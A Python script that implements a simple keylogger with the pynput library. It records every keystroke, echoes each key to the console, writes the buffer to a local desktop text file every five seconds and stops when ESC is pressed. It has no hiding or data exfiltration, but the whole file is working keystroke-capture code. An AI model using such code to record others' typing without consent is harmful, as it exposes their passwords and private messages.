import os
import threading
import pynput
from pynput import keyboard

class KeyLogger:
    def __init__(self, time_interval: int, log_file_path: str):
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.log_file_path = log_file_path
        self.running = True  # Flag to control whether the keylogger is running

        # Create the directory for the log file if it doesn't exist
        log_dir = os.path.dirname(self.log_file_path)
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

        # Create the log file if it doesn't exist
        if not os.path.exists(self.log_file_path):
            with open(self.log_file_path, 'w'):
                pass

    def append_to_log(self, string):
        assert isinstance(string, str)
        self.log += string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.esc:
                print("Exiting program...")
                self.stop()  # Stop the keylogger when 'ESC' key is pressed
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)
        print("Key pressed:", current_key)

    def save_to_file(self):
        with open(self.log_file_path, 'a') as file:
            file.write(self.log + '\n')
        self.log = ""  # Clear the log after saving to file
        if self.running:  # Check if the keylogger should continue running
            timer = threading.Timer(self.interval, self.save_to_file)
            timer.start()

    def start(self):
        self.running = True
        print("Keylogger started...")
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.save_to_file()
            keyboard_listener.join()
    

    def stop(self):
        self.running = False  # Set the running flag to False to stop the keylogger
        print("Keylogger stopped.")

# Example usage:
if __name__ == "__main__":
    log_file_path = 'C:\\Users\\Ruchi\\Desktop\\keylogger_log.txt'
    logger = KeyLogger(time_interval=5, log_file_path=log_file_path)
    logger.start()
